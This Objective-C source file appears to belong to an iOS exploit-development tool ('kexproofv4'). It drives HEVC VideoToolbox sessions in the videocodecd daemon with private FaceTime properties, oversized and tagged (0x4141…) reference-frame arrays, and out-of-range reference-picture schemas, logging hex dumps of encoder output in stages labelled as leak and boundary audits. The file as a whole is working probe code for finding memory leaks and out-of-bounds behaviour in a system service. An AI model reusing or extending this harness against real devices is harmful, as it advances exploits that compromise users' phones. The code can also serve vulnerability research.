#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>
#import <unistd.h>

typedef unsigned int kp_io_object_t;
typedef unsigned int kp_io_service_t;
typedef unsigned int kp_io_connect_t;
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kp_io_service_t IOServiceGetMatchingService(unsigned int mainPort, CFDictionaryRef matching);
extern kern_return_t IOServiceOpen(kp_io_service_t service, unsigned int owningTask, unsigned int type, kp_io_connect_t *conn);
extern kern_return_t IOServiceClose(kp_io_connect_t conn);
extern kern_return_t IOObjectRelease(kp_io_object_t obj);
extern kern_return_t IOConnectCallMethod(kp_io_connect_t conn, uint32_t selector,
                                         const uint64_t *input, uint32_t inputCnt,
                                         const void *inputStruct, size_t inputStructCnt,
                                         uint64_t *output, uint32_t *outputCnt,
                                         void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t selector,
                                               const void *inputStruct, size_t inputStructCnt,
                                               void *outputStruct, size_t *outputStructCnt);

static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    (void)src;
    (void)fl;
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    NSString *entry = nil;
    if (!sb) {
        entry = [NSString stringWithFormat:@"cb st=%d no-sample", (int)st];
    } else {
        CFDictionaryRef atts = CMCopyDictionaryOfAttachments(kCFAllocatorDefault, sb,
                                                             kCMAttachmentMode_ShouldPropagate);
        if (atts) {
            NSDictionary *d = (__bridge NSDictionary *)atts;
            entry = [NSString stringWithFormat:@"cb st=%d keys=%lu", (int)st, (unsigned long)d.count];
            CFRelease(atts);
        } else {
            entry = [NSString stringWithFormat:@"cb st=%d atts=(none)", (int)st];
        }
    }
    @synchronized (sink) {
        [sink addObject:entry];
    }
}

static void KPH9Drain(NSMutableArray *sink, int expected, int timeoutMs) {
    if (!sink || expected <= 0) return;
    int waited = 0;
    while (waited < timeoutMs) {
        int now = 0;
        @synchronized (sink) {
            now = (int)sink.count;
        }
        if (now >= expected) break;
        usleep(2000);
        waited += 2;
    }
}

static void KPH9OutAppend(NSMutableString *out, NSString *fmt, ...) NS_FORMAT_FUNCTION(2, 3);
static void KPH9OutAppend(NSMutableString *out, NSString *fmt, ...) {
    if (!out || !fmt) return;
    va_list args;
    va_start(args, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    if (!line) return;
    @synchronized (out) {
        [out appendString:line];
    }
}

// Serial bounded teardown (consumes caller's +1 create reference) and releases
// retainedRefCon / heapCtx ONLY after VTCompressionSessionInvalidate & CFRelease
// finish. Waiting up to 350 ms serializes healthy teardowns (<5 ms) so sessions
// never pile up concurrently in videocodecd, while a wedged session times out
// cleanly without deadlocking the stage thread or causing a callback UAF.
static void KPH9SafeTeardownEx(VTCompressionSessionRef s, CFTypeRef retainedRefCon, void *heapCtx) {
    if (!s) {
        if (retainedRefCon) CFRelease(retainedRefCon);
        if (heapCtx) free(heapCtx);
        return;
    }
    static dispatch_queue_t tdQueue;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        tdQueue = dispatch_queue_create("com.stealth.kexproofv4.h9.teardown", DISPATCH_QUEUE_SERIAL);
    });
    dispatch_semaphore_t done = dispatch_semaphore_create(0);
    dispatch_async(tdQueue, ^{
        VTCompressionSessionInvalidate(s);
        CFRelease(s);
        if (retainedRefCon) CFRelease(retainedRefCon);
        if (heapCtx) free(heapCtx);
        dispatch_semaphore_signal(done);
    });
    dispatch_semaphore_wait(done, dispatch_time(DISPATCH_TIME_NOW, 350 * (int64_t)NSEC_PER_MSEC));
}

static void KPH9SafeTeardown(VTCompressionSessionRef s) {
    KPH9SafeTeardownEx(s, NULL, NULL);
}

// Fast 500 ms probe on a fresh session to check whether videocodecd XPC is
// genuinely unreachable before skipping subsequent stages.
static BOOL KPH9IsVideoCodecdAlive(void) {
    __block BOOL alive = NO;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        VTCompressionSessionRef s = NULL;
        OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                                 kCMVideoCodecType_HEVC,
                                                 NULL, NULL, NULL, NULL, NULL, &s);
        if (st == noErr && s) {
            alive = YES;
            KPH9SafeTeardown(s);
        }
        dispatch_semaphore_signal(sem);
    });
    long w = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 500 * (int64_t)NSEC_PER_MSEC));
    return (w == 0) && alive;
}

// === Stage 6: XPC Bitstream / NAL / Attachments Leak & Exact DPB Boundary ===
// (analyst module, integrated; its bare CompleteFrames(kCMTimeInvalid) replaced
// with a bounded poll - that call deadlocks on wedged sessions)
typedef struct {
    volatile int cbCount;
    volatile int closed;
    volatile int targetIdx;
    OSStatus lastStatus;
    char summary[512];
    char first[512];  // cb#1 (IDR at pts=0)
    char second[512]; // cb#2 (P-frame at pts=1, never overwritten by cb#3..4)
    char target[512]; // cb#(targetIdx) (pinned post-update frame callback)
} Stage6ProbeResult;

static Stage6ProbeResult *Stage6AllocResult(void) {
    Stage6ProbeResult *res = (Stage6ProbeResult *)calloc(1, sizeof(Stage6ProbeResult));
    if (res) {
        res->targetIdx = 2;
        snprintf(res->summary, sizeof(res->summary), "(no cb)");
        snprintf(res->first, sizeof(res->first), "(no cb)");
        snprintf(res->second, sizeof(res->second), "(no cb)");
        snprintf(res->target, sizeof(res->target), "(no cb)");
    }
    return res;
}

static NSString *HexDumpSlice(const uint8_t *buf, size_t len, size_t maxBytes) {
    size_t n = (len < maxBytes) ? len : maxBytes;
    NSMutableString *hex = [NSMutableString stringWithCapacity:n * 2];
    for (size_t i = 0; i < n; i++) {
        [hex appendFormat:@"%02x", buf[i]];
    }
    return hex;
}

// Walks HVCC 4-byte length-prefixed NAL units inside CMBlockBuffer to find
// the first VCL slice NALU (nal_unit_type 0..21), skipping PREFIX_SEI (39).
static NSString *ExtractHVCCVclSliceSummary(const uint8_t *buf, size_t len) {
    if (!buf || len < 6) return @"none";
    size_t off = 0;
    unsigned naluCount = 0;
    const uint8_t *vclPtr = NULL;
    size_t vclLen = 0;
    unsigned vclType = 0xff;
    while (off + 4 <= len) {
        uint32_t naluLen = ((uint32_t)buf[off] << 24) |
                           ((uint32_t)buf[off + 1] << 16) |
                           ((uint32_t)buf[off + 2] << 8) |
                           (uint32_t)buf[off + 3];
        off += 4;
        if (naluLen == 0 || off + naluLen > len) break;
        naluCount++;
        unsigned nalType = (buf[off] >> 1) & 0x3f;
        if (nalType <= 21 && !vclPtr) {
            vclPtr = buf + off;
            vclLen = naluLen;
            vclType = nalType;
        }
        off += naluLen;
    }
    if (vclPtr) {
        return [NSString stringWithFormat:@"n=%u,t=%u,l=%zu:%@",
                naluCount, vclType, vclLen, HexDumpSlice(vclPtr, vclLen, 20)];
    }
    return [NSString stringWithFormat:@"raw(%zu):%@", len, HexDumpSlice(buf, len, 20)];
}

static void Stage6OutputCallback(void *outputCallbackRefCon,
                                 void *sourceFrameRefCon,
                                 OSStatus status,
                                 VTEncodeInfoFlags infoFlags,
                                 CMSampleBufferRef sampleBuffer) {
    (void)sourceFrameRefCon;
    Stage6ProbeResult *res = (Stage6ProbeResult *)outputCallbackRefCon;
    if (!res || res->closed) return;
    if (status != noErr || !sampleBuffer) {
        @synchronized ([KPH9EncoderModule class]) {
            if (res->closed) return;
            res->cbCount++;
            res->lastStatus = status;
            snprintf(res->summary, sizeof(res->summary),
                     "cb#%d st=%d info=0x%x sbuf=NULL",
                     res->cbCount, (int)status, (unsigned)infoFlags);
            if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
            if (res->cbCount == 2) snprintf(res->second, sizeof(res->second), "%s", res->summary);
            if (res->cbCount == res->targetIdx) snprintf(res->target, sizeof(res->target), "%s", res->summary);
        }
        return;
    }
    CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, false);
    NSUInteger saKeys = 0;
    NSString *saDump = @"";
    if (saArray && CFArrayGetCount(saArray) > 0) {
        CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
        if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
            saKeys = CFDictionaryGetCount(dict);
            NSDictionary *nsDict = (__bridge NSDictionary *)dict;
            NSMutableArray *kvParts = [NSMutableArray array];
            for (id k in nsDict) {
                [kvParts addObject:[NSString stringWithFormat:@"%@=%@", k, nsDict[k]]];
            }
            saDump = [kvParts componentsJoinedByString:@","];
        }
    }
    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
    size_t paramCount = 0;
    NSString *spsHex = @"none";
    if (fmt) {
        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &paramCount, NULL);
        const uint8_t *spsPtr = NULL;
        size_t spsSize = 0;
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 1, &spsPtr, &spsSize, NULL, NULL) == noErr && spsPtr) {
            spsHex = HexDumpSlice(spsPtr, spsSize, 24);
        }
    }
    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sampleBuffer);
    NSString *vclSummary = @"none";
    size_t totalLen = 0;
    if (block) {
        char *dataPtr = NULL;
        size_t lengthAtOffset = 0;
        if (CMBlockBufferGetDataPointer(block, 0, &lengthAtOffset, &totalLen, &dataPtr) == noErr && dataPtr) {
            vclSummary = ExtractHVCCVclSliceSummary((const uint8_t *)dataPtr, lengthAtOffset);
        }
    }
    @synchronized ([KPH9EncoderModule class]) {
        if (res->closed) return;
        res->cbCount++;
        res->lastStatus = status;
        snprintf(res->summary, sizeof(res->summary),
                 "cb#%d st=%d info=0x%x saKeys=%lu{%s} ps=%zu sps=%s vcl(%zu)=%s",
                 res->cbCount, (int)status, (unsigned)infoFlags,
                 (unsigned long)saKeys, [saDump UTF8String], paramCount,
                 [spsHex UTF8String], totalLen, [vclSummary UTF8String]);
        if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
        if (res->cbCount == 2) snprintf(res->second, sizeof(res->second), "%s", res->summary);
        if (res->cbCount == res->targetIdx) snprintf(res->target, sizeof(res->target), "%s", res->summary);
    }
}

static CVPixelBufferRef CreateDummyNV12Buffer(int width, int height) {
    CVPixelBufferRef px = NULL;
    NSDictionary *attrs = @{
        (id)kCVPixelBufferIOSurfacePropertiesKey : @{}
    };
    CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        (__bridge CFDictionaryRef)attrs, &px);
    return px;
}

static void KPH9PrimeRealTime(VTCompressionSessionRef session) {
    if (!session) return;
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
}

static void KPH9EncodeAndFlushTwoCallbacks(VTCompressionSessionRef session,
                                           CVPixelBufferRef px,
                                           CFDictionaryRef frame1Props,
                                           Stage6ProbeResult *res,
                                           OSStatus *outE0,
                                           OSStatus *outE1) {
    if (!session || !px || !res) return;
    OSStatus e0 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    OSStatus e1 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid, frame1Props, NULL, NULL);
    if (outE0) *outE0 = e0;
    if (outE1) *outE1 = e1;
    int waited = 0;
    while (res->cbCount < 2 && waited < 150) { usleep(2000); waited += 2; }
    for (int pts = 2; pts <= 5 && res->cbCount < 2; pts++) {
        VTCompressionSessionEncodeFrame(session, px, CMTimeMake(pts, 30), kCMTimeInvalid, NULL, NULL, NULL);
        int stepWait = 0;
        while (res->cbCount < 2 && stepWait < 40) { usleep(2000); stepWait += 2; waited += 2; }
    }
}

static void RunStage6_XPCLeakAndBoundaryAudit(NSMutableString *log) {
    KPH9OutAppend(log, @"\n--- Stage 6: DPB Exact Boundary (1..15, 34..48) & Bitstream/NAL Audit ---\n");
    int probeCounts[] = {
        1, 2, 3, 4, 8, 15,
        34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48
    };
    size_t numProbes = sizeof(probeCounts) / sizeof(probeCounts[0]);
    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
    if (!px) {
        KPH9OutAppend(log, @"  [!] Failed to allocate CVPixelBuffer\n");
        return;
    }
    for (size_t i = 0; i < numProbes; i++) {
        int count = probeCounts[i];
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) continue;
        VTCompressionSessionRef session = NULL;
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, 192, 144,
            kCMVideoCodecType_HEVC, (__bridge CFDictionaryRef)spec, NULL, NULL,
            Stage6OutputCallback, res, &session);
        if (st != noErr || !session) {
            KPH9OutAppend(log, @"  dpb[x%-2d] create=%d\n", count, (int)st);
            free(res);
            continue;
        }
        VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        KPH9PrimeRealTime(session);
        NSMutableArray *dpbArr = [NSMutableArray arrayWithCapacity:count];
        for (int k = 0; k < count; k++) {
            uint64_t tagged = 0x4141414141410000ULL | (uint64_t)k;
            CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &tagged);
            [dpbArr addObject:(__bridge_transfer id)num];
        }
        OSStatus setSt = VTSessionSetProperty(
            session,
            CFSTR("UserDPBFramesForFaceTime"),
            (__bridge CFTypeRef)dpbArr);
        VTCompressionSessionPrepareToEncodeFrames(session);
        KPH9EncodeAndFlushTwoCallbacks(session, px, NULL, res, NULL, NULL);
        @synchronized ([KPH9EncoderModule class]) {
            res->closed = 1;
            KPH9OutAppend(log, @"  dpb[tagged x%-2d] set=%-6d cbs=%d | cb1: %s | cb2: %s\n",
                          count, (int)setSt, res->cbCount, res->first, res->second);
        }
        KPH9SafeTeardownEx(session, NULL, res);
    }
    KPH9OutAppend(log, @"  [6B: Dyadic Clamp Ratio Steering (ExpectedFrameRate / BaseLayerFrameRate)]\n");
    double baseRates[] = { 15.0, 7.5, 3.75, 1.0, 0.5, 0.25, 0.0625 };
    for (size_t i = 0; i < sizeof(baseRates) / sizeof(baseRates[0]); i++) {
        VTCompressionSessionRef session = NULL;
        NSDictionary *spec = @{
            @"EncoderUsage": @1,
            @"NumberOfTemporalLayers": @16447,
            @"AllowTemporalCompression": @YES,
        };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                       kCMVideoCodecType_HEVC, (__bridge CFDictionaryRef)spec, NULL, NULL,
                                       Stage6OutputCallback, NULL, &session) == noErr && session) {
            int expFps = 240;
            double baseFps = baseRates[i];
            CFNumberRef nExp = CFNumberCreate(NULL, kCFNumberIntType, &expFps);
            CFNumberRef nBase = CFNumberCreate(NULL, kCFNumberDoubleType, &baseFps);
            VTSessionSetProperty(session, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
            KPH9PrimeRealTime(session);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, nExp);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
            VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
            OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
            OSStatus postSetSt = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
            CFNumberRef postNtlRef = NULL;
            int postNtl = -1;
            if (VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &postNtlRef) == noErr && postNtlRef) {
                CFNumberGetValue(postNtlRef, kCFNumberIntType, &postNtl);
                CFRelease(postNtlRef);
            }
            KPH9OutAppend(log, @"  ratio 240/%.4f -> prep=%d postSet=%d POST_NTL=%d\n",
                          baseFps, (int)prepSt, (int)postSetSt, postNtl);
            CFRelease(nExp);
            CFRelease(nBase);
            KPH9SafeTeardown(session);
        }
    }
    CVPixelBufferRelease(px);
}

static void Stage7RunCustomDPBArrayEx(NSMutableString *log,
                                      CVPixelBufferRef px,
                                      NSString *label,
                                      NSArray *arr,
                                      int timingMode,
                                      int dpbNumFrames) {
    Stage6ProbeResult *res = Stage6AllocResult();
    if (!res) return;
    VTCompressionSessionRef session = NULL;
    NSMutableDictionary *spec = [NSMutableDictionary dictionaryWithObject:@YES forKey:@"EnableUserRefForFacetime"];
    if (dpbNumFrames > 0) {
        spec[@"EncoderUsage"] = @1;
    }
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, NULL, Stage6OutputCallback, res, &session);
    if (st != noErr || !session) {
        KPH9OutAppend(log, @"  dpb[%@] create=%d\n", label, (int)st);
        free(res);
        return;
    }
    VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
    KPH9PrimeRealTime(session);
    OSStatus setSt = -999;
    if (timingMode == 0) {
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
    } else if (timingMode >= 2) {
        // Prime @pre with 34 valid zero slots (17 pairs) so UserDPB mode is active before IDR
        NSMutableArray *prime34 = [NSMutableArray arrayWithCapacity:34];
        for (int k = 0; k < 34; k++) [prime34 addObject:@0];
        VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)prime34);
    }
    OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
    if (timingMode == 1) {
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
    }
    OSStatus e0 = -1, e1 = -1;
    if (px) {
        if (timingMode >= 2) {
            // timingMode == 2 -> 1 warmup frame (IDR, pts=0); timingMode == 5 -> 4 warmup frames (pts=0..3)
            int warmupFrames = timingMode - 1;
            int pts = 0;
            for (; pts < warmupFrames; pts++) {
                OSStatus ew = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(pts, 30), kCMTimeInvalid, NULL, NULL, NULL);
                if (pts == 0) e0 = ew;
                int w = 0;
                while (res->cbCount < (pts + 1) && w < 80) { usleep(2000); w += 2; }
            }
            // Ensure warmup frames actually emitted callbacks before mutating UserDPBFramesForFaceTime
            for (int flushPts = 0; flushPts < 4 && res->cbCount < warmupFrames; flushPts++, pts++) {
                VTCompressionSessionEncodeFrame(session, px, CMTimeMake(pts, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int fw = 0;
                while (res->cbCount < warmupFrames && fw < 40) { usleep(2000); fw += 2; }
            }
            int targetCb = res->cbCount + 1;
            res->targetIdx = targetCb;
            setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
            NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
            e1 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                 (__bridge CFDictionaryRef)fp, NULL, NULL);
            int w1 = 0;
            while (res->cbCount < targetCb && w1 < 120) { usleep(2000); w1 += 2; }
            for (int extra = 0; extra < 4 && res->cbCount < targetCb; extra++, pts++) {
                VTCompressionSessionEncodeFrame(session, px, CMTimeMake(pts, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int sw = 0;
                while (res->cbCount < targetCb && sw < 40) { usleep(2000); sw += 2; }
            }
        } else {
            res->targetIdx = 2;
            KPH9EncodeAndFlushTwoCallbacks(session, px, NULL, res, &e0, &e1);
        }
    }
    @synchronized ([KPH9EncoderModule class]) {
        res->closed = 1;
        const char *postCb = (timingMode >= 2) ? res->target : res->second;
        KPH9OutAppend(log, @"  dpb[%@] set=%d prep=%d enc=%d/%d cbs=%d | cb1: %s | cbPost(#%d): %s\n",
                      label, (int)setSt, (int)prepSt,
                      (int)e0, (int)e1, res->cbCount, res->first, res->targetIdx, postCb);
    }
    KPH9SafeTeardownEx(session, NULL, res);
}

static void Stage7RunCustomDPBArray(NSMutableString *log,
                                    CVPixelBufferRef px,
                                    NSString *label,
                                    NSArray *arr,
                                    int timingMode) {
    Stage7RunCustomDPBArrayEx(log, px, label, arr, timingMode, 0);
}

static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
    KPH9OutAppend(log, @"\n--- Stage 7: Pairwise (2*p,2*p+1) vs Odd-Tail x35 + True Post-IDR/Post-4F DPB + Safe Dict UserRPS ---\n");
    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
    if (!px) {
        KPH9OutAppend(log, @"  [!] Failed to allocate CVPixelBuffer\n");
        return;
    }

    long long tagBase = 0x4141414141410000LL;

    // 7A: Contrast validated 17th pair (slot[32], slot[33] in x34/x35) vs unvalidated odd 35th element (slot[34] in x35) @pre
    KPH9OutAppend(log, @"  [7A: Pair #16 (slots 32..33) validated vs Odd Tail slot[34] unvalidated in x34/x35 @pre]\n");
    int tailSlots[] = { 31, 32, 33, 34 };
    for (size_t si = 0; si < sizeof(tailSlots) / sizeof(tailSlots[0]); si++) {
        int slotIdx = tailSlots[si];
        NSMutableArray *arrOne = [NSMutableArray arrayWithCapacity:35];
        NSMutableArray *arrTag = [NSMutableArray arrayWithCapacity:35];
        for (int k = 0; k < 35; k++) {
            [arrOne addObject:(k == slotIdx) ? @1 : @0];
            [arrTag addObject:(k == slotIdx) ? @(tagBase | (uint64_t)slotIdx) : @0];
        }
        Stage7RunCustomDPBArray(log, px, [NSString stringWithFormat:@"x35 only-slot[%02d]=1@pre", slotIdx], arrOne, 0);
        Stage7RunCustomDPBArray(log, px, [NSString stringWithFormat:@"x35 only-slot[%02d]=tag@pre", slotIdx], arrTag, 0);
    }

    // 7B: True Post-IDR (timingMode=2, after cb#1 IDR confirmed) & Post-4F (timingMode=5, after 4 DPB frames confirmed)
    // With AllowFrameReordering=NO, warmup frames genuinely populate the DPB before UserDPBFramesForFaceTime is updated.
    KPH9OutAppend(log, @"  [7B: True @postIDR (1 DPB ref) & @post4F (4 DPB refs) Pairwise Value Steering (x2 & x34)]\n");
    long long postVals[] = { 0, 1, 2, 3, -1 };
    for (size_t vi = 0; vi < sizeof(postVals) / sizeof(postVals[0]); vi++) {
        long long v = postVals[vi];
        // Pair0 = (v, 0) and (0, v) and (v, v) after 1 frame (IDR) and after 4 frames in DPB
        Stage7RunCustomDPBArray(log, px, [NSString stringWithFormat:@"x2 pair0=(%lld,0)@postIDR", v], @[ @(v), @0 ], 2);
        Stage7RunCustomDPBArray(log, px, [NSString stringWithFormat:@"x2 pair0=(0,%lld)@postIDR", v], @[ @0, @(v) ], 2);
        Stage7RunCustomDPBArray(log, px, [NSString stringWithFormat:@"x2 pair0=(%lld,%lld)@post4F", v, v], @[ @(v), @(v) ], 5);
    }

    // 7C: 17-pair (x34) & 35-element (x35) OOB steering @postIDR and @post4F (after DPB populated)
    KPH9OutAppend(log, @"  [7C: x34 (17-pair) & x35 Tail Steering @postIDR (mode=2) and @post4F (mode=5)]\n");
    NSMutableArray *x34Zero = [NSMutableArray arrayWithCapacity:34];
    NSMutableArray *x34Slot32One = [NSMutableArray arrayWithCapacity:34];
    NSMutableArray *x34Slot33One = [NSMutableArray arrayWithCapacity:34];
    NSMutableArray *x34PairsOneZero = [NSMutableArray arrayWithCapacity:34];
    NSMutableArray *x35Slot34Tag = [NSMutableArray arrayWithCapacity:35];
    NSMutableArray *x35AllTag = [NSMutableArray arrayWithCapacity:35];
    for (int k = 0; k < 34; k++) {
        [x34Zero addObject:@0];
        [x34Slot32One addObject:(k == 32) ? @1 : @0];
        [x34Slot33One addObject:(k == 33) ? @1 : @0];
        [x34PairsOneZero addObject:(k % 2 == 0) ? @1 : @0];
        [x35Slot34Tag addObject:@0];
        [x35AllTag addObject:@(tagBase | (uint64_t)k)];
    }
    [x35Slot34Tag addObject:@(tagBase | 34ULL)];
    [x35AllTag addObject:@(tagBase | 34ULL)];

    Stage7RunCustomDPBArray(log, px, @"x34 all=0@postIDR", x34Zero, 2);
    Stage7RunCustomDPBArray(log, px, @"x34 slot32=1@postIDR", x34Slot32One, 2);
    Stage7RunCustomDPBArray(log, px, @"x34 slot33=1@postIDR", x34Slot33One, 2);
    Stage7RunCustomDPBArray(log, px, @"x34 (1,0)x17@postIDR", x34PairsOneZero, 2);
    Stage7RunCustomDPBArray(log, px, @"x34 (1,0)x17@post4F", x34PairsOneZero, 5);
    Stage7RunCustomDPBArray(log, px, @"x35 slot34=tag@postIDR", x35Slot34Tag, 2);
    Stage7RunCustomDPBArray(log, px, @"x35 all=tag@post4F", x35AllTag, 5);

    // 7D: Strictly NSDictionary-only UserRPSForFaceTime via frameProps (NO flat CFNumber arrays —
    // flat CFNumber arrays in UserRPSForFaceTime crash videocodecd even via encSpec and trigger launchd throttle!)
    KPH9OutAppend(log, @"  [7D: Crash-Safe NSDictionary UserRPSForFaceTime frameProps Probe (Zero-Latency Mode)]\n");
    NSMutableArray *oob32Neg = [NSMutableArray arrayWithCapacity:32];
    NSMutableArray *oob32Pos = [NSMutableArray arrayWithCapacity:32];
    for (int i = 0; i < 32; i++) {
        [oob32Neg addObject:@(-(i + 1))];
        [oob32Pos addObject:@(i + 1)];
    }
    NSArray<NSDictionary *> *rpsSchemas = @[
        @{ @"NumNegativePics": @1, @"NumPositivePics": @0, @"AbsDeltaRPSMinus1": @[@0], @"DeltaRPSSign": @[@0], @"UsedByCurrPicS0": @1U },
        @{ @"NumNegativePics": @2, @"NumPositivePics": @2, @"AbsDeltaRPSMinus1": @[@(-1), @(-2)], @"DeltaRPSSign": @[@1, @2], @"UsedByCurrPicS0": @3U, @"UsedByCurrPicS1": @3U },
        @{ @"NumNegativePics": @16, @"NumPositivePics": @16, @"AbsDeltaRPSMinus1": oob32Neg, @"DeltaRPSSign": oob32Pos, @"UsedByCurrPicS0": @0xFFFFU, @"UsedByCurrPicS1": @0xFFFFU },
        @{ @"NumNegativePics": @32, @"NumPositivePics": @32, @"AbsDeltaRPSMinus1": oob32Neg, @"DeltaRPSSign": oob32Pos, @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU },
    ];
    for (size_t ri = 0; ri < rpsSchemas.count; ri++) {
        NSDictionary *rpsDict = rpsSchemas[ri];
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) continue;
        res->targetIdx = 2;
        VTCompressionSessionRef session = NULL;
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)spec, NULL, NULL,
                                       Stage6OutputCallback, res, &session) != noErr || !session) {
            KPH9OutAppend(log, @"  rps[dictSchema#%zu] create failed\n", ri);
            free(res);
            continue;
        }
        VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        KPH9PrimeRealTime(session);
        OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
        OSStatus e0 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        int w0 = 0;
        while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
        NSDictionary *fp = @{
            @"UserRPSForFaceTime": @[rpsDict],
            @"AbsDeltaRPSMinus1": rpsDict[@"AbsDeltaRPSMinus1"] ?: @[],
            @"DeltaRPSSign": rpsDict[@"DeltaRPSSign"] ?: @[],
        };
        OSStatus e1 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid,
                                                      (__bridge CFDictionaryRef)fp, NULL, NULL);
        int w1 = 0;
        while (res->cbCount < 2 && w1 < 120) { usleep(2000); w1 += 2; }
        for (int pts = 2; pts <= 4 && res->cbCount < 2; pts++) {
            VTCompressionSessionEncodeFrame(session, px, CMTimeMake(pts, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int sw = 0;
            while (res->cbCount < 2 && sw < 40) { usleep(2000); sw += 2; }
        }
        @synchronized ([KPH9EncoderModule class]) {
            res->closed = 1;
            KPH9OutAppend(log, @"  rps[dictSchema#%zu] prep=%d enc=%d/%d cbs=%d | cb1: %s | cb2: %s\n",
                          ri, (int)prepSt, (int)e0, (int)e1, res->cbCount, res->first, res->second);
        }
        KPH9SafeTeardownEx(session, NULL, res);
    }

    CVPixelBufferRelease(px);
}

static CVPixelBufferRef KPH9CreatePixelBuffer(int width, int height) {
    CVPixelBufferRef pb = NULL;
    if (CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            NULL, &pb) == kCVReturnSuccess && pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)height);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)height / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

